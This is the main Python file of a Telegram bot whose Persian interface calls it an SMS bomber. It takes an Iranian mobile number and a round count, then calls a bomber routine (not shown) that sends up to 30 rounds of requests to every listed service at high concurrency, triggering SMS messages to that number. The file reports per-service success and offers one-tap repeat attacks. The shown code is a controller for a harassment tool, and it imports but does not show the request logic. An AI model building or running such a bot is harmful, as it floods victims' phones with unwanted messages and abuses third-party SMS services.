# main.py
import asyncio
import logging
import os
import re
import time

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (BotCommand, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, Message)

from bomber import run_bomb
from services import SERVICES

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(name)s: %(message)s")
log = logging.getLogger("bomber-bot")

BOT_TOKEN   = os.getenv("BOT_TOKEN", "").strip()
CONCURRENCY = int(os.getenv("CONCURRENCY", "30"))
TIMEOUT     = float(os.getenv("TIMEOUT", "15"))
MAX_ROUNDS  = int(os.getenv("MAX_ROUNDS", "30"))

PHONE_RE  = re.compile(r"^09\d{9}$")
FA_DIGITS = str.maketrans("۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩", "01234567890123456789")

_locks: dict[int, asyncio.Lock] = {}


def normalize_phone(raw: str):
    d = re.sub(r"\D", "", raw.translate(FA_DIGITS))
    if d.startswith("0098"):
        d = d[4:]
    elif d.startswith("98") and len(d) == 12:
        d = d[2:]
    if len(d) == 10 and d.startswith("9"):
        d = "0" + d
    return d if PHONE_RE.match(d) else None


class Form(StatesGroup):
    phone  = State()
    rounds = State()


dp = Dispatcher()

WELCOME = (
    "👋 <b>بمبر پیامکی</b>\n\n"
    f"🧩 تعداد سرویس‌های فعال: <b>{len(SERVICES)}</b>\n\n"
    "شماره موبایل رو بفرست (مثال: <code>09123456789</code>)\n"
    "بعدش تعداد دور رو انتخاب می‌کنی و شروع می‌کنیم."
)

ROUNDS_KB = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="۱ دور", callback_data="cnt:1"),
     InlineKeyboardButton(text="۳ دور", callback_data="cnt:3"),
     InlineKeyboardButton(text="۵ دور", callback_data="cnt:5")],
    [InlineKeyboardButton(text="۱۰ دور", callback_data="cnt:10"),
     InlineKeyboardButton(text="۲۰ دور", callback_data="cnt:20")],
])


def progress_bar(pct: int) -> str:
    filled = pct // 5
    return "█" * filled + "░" * (20 - filled)


def build_report(phone: str, rounds: int, res: dict) -> str:
    total = res["ok"] + res["fail"]
    lines = [
        "🏁 <b>گزارش نهایی</b>",
        "",
        f"📱 شماره: <code>{phone}</code>",
        f"🔁 دور: <b>{rounds}</b> × {len(SERVICES)} سرویس = <b>{total}</b> درخواست",
        f"⏱ زمان: <b>{res['seconds']:.1f}</b> ثانیه",
        "",
        f"✅ موفق: <b>{res['ok']}</b>",
        f"❌ ناموفق: <b>{res['fail']}</b>",
        "",
        "<b>جزئیات هر سرویس:</b>",
    ]
    for name, st in sorted(res["per"].items(), key=lambda x: (-x[1]["ok"], x[0])):
        if st["ok"] and not st["fail"]:
            icon = "✅"
        elif st["ok"]:
            icon = "🟡"
        else:
            icon = "❌"
        lines.append(f"{icon} {name} — {st['ok']}✅ / {st['fail']}❌")
    return "\n".join(lines)


DONE_KB = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔁 همین شماره، دوباره", callback_data="again")],
    [InlineKeyboardButton(text="🆕 شماره جدید", callback_data="new")],
])


# ---------------- handlers ----------------

@dp.message(Command("start"))
async def cmd_start(m: Message, state: FSMContext):
    await state.clear()
    await state.set_state(Form.phone)
    await m.answer(WELCOME)


@dp.message(Command("cancel"))
async def cmd_cancel(m: Message, state: FSMContext):
    await state.clear()
    await state.set_state(Form.phone)
    await m.answer("❌ لغو شد.\nشماره جدید رو بفرست:")


@dp.message(Command("services"))
async def cmd_services(m: Message):
    names = "\n".join(f"{i+1}. {s['name']}" for i, s in enumerate(SERVICES))
    await m.answer(f"🧩 <b>{len(SERVICES)} سرویس فعال:</b>\n\n{names}")


@dp.message(Command("check"))
async def cmd_check(m: Message, state: FSMContext):
    """/check یا /check 0912... — یک دور تست روی همه سرویس‌ها."""
    arg = (m.text or "").split(maxsplit=1)
    phone = normalize_phone(arg[1]) if len(arg) > 1 else None
    if not phone:
        data = await state.get_data()
        phone = data.get("phone")
    if not phone:
        await m.answer("شماره رو بده: <code>/check 09123456789</code>")
        return
    await do_bomb(m, state, phone, 1)


@dp.message(Form.phone, F.text)
async def got_phone(m: Message, state: FSMContext):
    phone = normalize_phone(m.text)
    if not phone:
        await m.answer("⚠️ شماره معتبر نیست. مثال: <code>09123456789</code>")
        return
    await state.update_data(phone=phone)
    await state.set_state(Form.rounds)
    await m.answer(
        f"✅ شماره: <code>{phone}</code>\n\n"
        "چند دور بزنم؟ (هر دور = یک پیامک به هر سرویس)\n"
        "از دکمه‌ها انتخاب کن یا یه عدد بفرست:",
        reply_markup=ROUNDS_KB,
    )


@dp.callback_query(Form.rounds, F.data.startswith("cnt:"))
async def got_rounds_cb(cb: CallbackQuery, state: FSMContext):
    await cb.answer()
    rounds = int(cb.data.split(":")[1])
    await do_bomb(cb.message, state, (await state.get_data())["phone"], rounds)


@dp.message(Form.rounds, F.text)
async def got_rounds_text(m: Message, state: FSMContext):
    raw = m.text.translate(FA_DIGITS)
    if not raw.isdigit():
        await m.answer("⚠️ یه عدد بفرست یا از دکمه‌ها انتخاب کن.")
        return
    rounds = max(1, min(int(raw), MAX_ROUNDS))
    await do_bomb(m, state, (await state.get_data())["phone"], rounds)


@dp.callback_query(F.data == "again")
async def cb_again(cb: CallbackQuery, state: FSMContext):
    await cb.answer()
    data = await state.get_data()
    await do_bomb(cb.message, state, data["phone"], data.get("rounds", 1))


@dp.callback_query(F.data == "new")
async def cb_new(cb: CallbackQuery, state: FSMContext):
    await cb.answer()
    await state.clear()
    await state.set_state(Form.phone)
    await cb.message.answer("شماره جدید رو بفرست:")


# ---------------- core ----------------

async def do_bomb(target: Message, state: FSMContext, phone: str, rounds: int):
    chat_id = target.chat.id
    lock = _locks.setdefault(chat_id, asyncio.Lock())
    if lock.locked():
        await target.answer("⏳ یه عملیات در حال اجراست، صبر کن...")
        return

    async with lock:
        await state.set_state(Form.rounds)
        await state.update_data(phone=phone, rounds=rounds)

        total = rounds * len(SERVICES)
        msg = await target.answer(
            f"🚀 شروع شد\n\n📱 <code>{phone}</code>\n"
            f"🔁 {rounds} دور × {len(SERVICES)} سرویس = {total} درخواست"
        )

        last = [0.0]

        async def on_progress(done, rnds, ok, fail):
            now = time.monotonic()
            if now - last[0] < 1.5 and done < rnds:
                return
            last[0] = now
            pct = int(done / rnds * 100)
            try:
                await msg.edit_text(
                    f"⚡️ در حال ارسال...\n\n"
                    f"📱 <code>{phone}</code>\n"
                    f"🔁 دور {done}/{rnds}\n\n"
                    f"<code>{progress_bar(pct)}</code> {pct}%\n\n"
                    f"✅ موفق: <b>{ok}</b>\n❌ ناموفق: <b>{fail}</b>"
                )
            except Exception:      # noqa: BLE001
                pass

        res = await run_bomb(phone, rounds, SERVICES,
                             on_progress=on_progress,
                             concurrency=CONCURRENCY, timeout=TIMEOUT)

        await state.set_state(Form.rounds)
        await msg.edit_text(build_report(phone, rounds, res), reply_markup=DONE_KB)
        log.info("bomb %s rounds=%s ok=%s fail=%s", phone, rounds,
                 res["ok"], res["fail"])


# ---------------- health server (برای Railway) ----------------

async def start_health():
    if os.getenv("ENABLE_HEALTH", "1") != "1":
        return
    try:
        from aiohttp import web
        app = web.Application()
        app.router.add_get("/", lambda r: web.Response(text="bomber bot: OK"))
        runner = web.AppRunner(app)
        await runner.setup()
        port = int(os.getenv("PORT", "8080"))
        await web.TCPSite(runner, "0.0.0.0", port).start()
        log.info("health server on :%s", port)
    except Exception as e:          # noqa: BLE001
        log.warning("health server skipped: %s", e)


async def main():
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN ست نشده!")
    bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    await bot.set_my_commands([
        BotCommand(command="start",    description="شروع"),
        BotCommand(command="services", description="لیست سرویس‌ها"),
        BotCommand(command="check",    description="تست سریع روی همه سرویس‌ها"),
        BotCommand(command="cancel",   description="لغو"),
    ])
    asyncio.create_task(start_health())
    log.info("bot started with %d services", len(SERVICES))
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
